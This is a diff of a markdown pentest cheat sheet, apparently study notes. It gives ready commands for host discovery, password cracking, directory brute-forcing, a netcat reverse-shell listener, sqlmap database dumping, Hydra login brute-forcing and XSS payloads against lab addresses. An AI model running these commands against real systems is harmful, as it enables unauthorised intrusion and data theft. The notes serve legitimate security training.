@@ -14,12 +14,13 @@ fping -a -g 10.10.10.0/24 2>/dev/null > targets       #Host Discover
 ``` 
 ## IP Route
 **Syntax**\
-ip route add \<Network-range\> via \<router-IP\> dev \<interface\>\
-eg.\
+ip route add \<Network-range\> via \<router-IP\> dev \<interface\>
 ```sh
 ip route add 10.10.10.0/24 via 10.10.11.1 dev tap0
 
-route         #To Check
+ip route    # Checking defined routes in linux
+route       # Checking defined routes in linux
+route print     # Checking defined routes in windows
 ```
 ## John
 ```sh
@@ -28,55 +29,81 @@ unshadow passwd shadow > unshadowed.txt\
 john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
 ```
 ## dirbuster
+
 ![alt text](https://github.com/SattamInfosec/SattamInfosec/blob/main/Dirbuster.PNG)
+
+
+## Gobuster 
+```sh
+gobuster dir -u http://example.com -w /usr/usr/wordlists/dirb/common.txt 
+
+gobuster dir -u http://example.com -w /usr/usr/wordlists/dirb/common.txt -s 302
+```
 
 
 ## Netcat
 **Listening for reverse shell**\
+```sh
 nc -nvlp 1234
-
+```
 **Banner Grabbing**\
+```sh
 nc -nv 10.10.10.10 \<port\>
-
+```
 ## SQLMap
 #### Check if injection exists
-sqlmap -r Post.req\
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id\
+```sh
+sqlmap -r Post.req
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin"
-
+```
 #### Get database if injection Exists
-sqlmap -r login.req --dbs\
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs\
-sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs\
-
+```sh
+sqlmap -r login.req --dbs
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id --dbs
+sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" --dbs
+```
 #### Get Tables in a Database
-sqlmap -r login.req -D dbname --tables\
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables\
+```sh
+sqlmap -r login.req -D dbname --tables
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname --tables
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname --tables
-
+```
 #### Get data in a Database tables
-sqlmap -r login.req -D dbname -T table_name --dump\
-sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump\
+```sh
+sqlmap -r login.req -D dbname -T table_name --dump
+sqlmap -u "http://10.10.10.10/file.php?id=1" -p id -D dbname -T table_name --dump
 sqlmap -u "http://10.10.10.10/login.php" --data="user=admin&password=admin" -D dbname -T table_name --dump
+```
 
 ## Hydra
 **SSH Login Bruteforcing**\
-hydra -v -V -u -L users.txt -P passwords.txt -t 1 -u 10.10.10.10 ssh\
-hydra -v -V -u -l root -P passwords.txt -t 1 -u 10.10.10.10 ssh\
-*You can use same for FTP, just replace ssh with ftp*
+```sh
+hydra -L userslist -P passwordslist ftp://10.10.10.10
+hydra -l root -P passwordslist ssh://10.10.10.10 
+hydra -L userlist -p password123 ftp://10.10.10.10
+```sh
 
 **HTTP POST Form**\
+```sh
 hydra http://10.10.10.10/ http-post-form "/login.php:user=^USER^&password=^PASS^:Incorrect credentials" -L usernames.txt -P passwords.txt -f -V
+```
 
 *You will know which wordlists to use when the time comes*
 
 
 ## XSS
+```
 \<script\>alert(1)\</script\>\
 \<ScRiPt\>alert(1)\</ScRiPt\>
 
 *This is a great filter bypass cheatsheet*\
 https://owasp.org/www-community/xss-filter-evasion-cheatsheet
+
+## XSS via GET & POST Request
+
+
+![alt text](https://github.com/SattamInfosec/SattamInfosec/blob/main/XSS%20Via%20GET%20%26%20POST.PNG)
 
 ## msfvenom shells
 **JSP Java Meterpreter Reverse TCP**\
